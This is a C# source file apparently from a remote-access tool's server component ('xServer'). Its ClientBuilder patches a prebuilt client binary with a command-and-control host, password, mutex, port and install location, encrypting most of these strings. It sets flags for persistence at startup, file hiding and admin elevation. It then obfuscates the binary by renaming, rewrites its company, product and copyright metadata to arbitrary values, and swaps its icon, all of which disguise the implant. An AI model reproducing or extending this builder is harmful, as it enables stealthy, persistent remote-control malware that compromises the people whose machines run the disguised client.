using System;
using System.IO;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Vestris.ResourceLib;
using xServer.Core.Encryption;

namespace xServer.Core.Build
{
    public static class ClientBuilder
    {
        public static void Build(string output, string host, string password, string installsub, string installname,
            string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay,
            int installpath, bool adminelevation, string iconpath, string[] asminfo, string version)
        {
            // PHASE 1 - Settings
            string encKey = Helper.Helper.GetRandomName(20);
            AssemblyDefinition asmDef;
            try
            {
                asmDef = AssemblyDefinition.ReadAssembly("client.bin");
            }
            catch (Exception ex)
            {
                throw new FileLoadException(ex.Message);
            }

            foreach (var typeDef in asmDef.Modules[0].Types)
            {
                if (typeDef.FullName == "xClient.Config.Settings")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            int strings = 1, bools = 1, ints = 1;

                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode.Name == "ldstr") // string
                                {
                                    switch (strings)
                                    {
                                        case 1: //version
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(version, encKey);
                                            break;
                                        case 2: //ip/hostname
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(host, encKey);
                                            break;
                                        case 3: //password
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(password, encKey);
                                            break;
                                        case 4: //installsub
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(installsub, encKey);
                                            break;
                                        case 5: //installname
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(installname, encKey);
                                            break;
                                        case 6: //mutex
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(mutex, encKey);
                                            break;
                                        case 7: //startupkey
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(startupkey, encKey);
                                            break;
                                        case 8: //random encryption key
                                            methodDef.Body.Instructions[i].Operand = encKey;
                                            break;
                                    }
                                    strings++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.1" ||
                                         methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.0") // bool
                                {
                                    switch (bools)
                                    {
                                        case 1: //install
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(install));
                                            break;
                                        case 2: //startup
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(startup));
                                            break;
                                        case 3: //hidefile
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(hidefile));
                                            break;
                                        case 4: //AdminElevation
                                            methodDef.Body.Instructions[i] =
                                                Instruction.Create(BoolOpcode(adminelevation));
                                            break;
                                    }
                                    bools++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4") // int
                                {
                                    switch (ints)
                                    {
                                        case 1: //port
                                            methodDef.Body.Instructions[i].Operand = port;
                                            break;
                                        case 2: //reconnectdelay
                                            methodDef.Body.Instructions[i].Operand = reconnectdelay;
                                            break;
                                    }
                                    ints++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.s") // sbyte
                                {
                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(installpath);
                                }
                            }
                        }
                    }
                }
            }

            // PHASE 2 - Renaming
            Renamer r = new Renamer(asmDef);
            if (!r.Perform())
                throw new Exception("renaming failed");

            // PHASE 3 - Saving
            r.AsmDef.Write(output);

            // PHASE 4 - Assembly Information changing
            if (asminfo != null)
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(output);

                versionResource.FileVersion = asminfo[7];
                versionResource.ProductVersion = asminfo[6];
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
                stringFileInfo["CompanyName"] = asminfo[2];
                stringFileInfo["FileDescription"] = asminfo[1];
                stringFileInfo["ProductName"] = asminfo[0];
                stringFileInfo["LegalCopyright"] = asminfo[3];
                stringFileInfo["LegalTrademarks"] = asminfo[4];
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = asminfo[5];
                stringFileInfo["OriginalFilename"] = asminfo[5];

                versionResource.SaveTo(output);
            }

            // PHASE 5 - Icon changing
            if (!string.IsNullOrEmpty(iconpath))
                IconInjector.InjectIcon(output, iconpath);
        }

        private static OpCode BoolOpcode(bool p)
        {
            return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
        }

        private static sbyte GetSpecialFolder(int installpath)
        {
            switch (installpath)
            {
                case 1:
                    return 26; // Appdata
                case 2:
                    return 38; // ProgramFiles
                case 3:
                    return 37; // System
                default:
                    throw new ArgumentException("InstallPath");
            }
        }
    }
}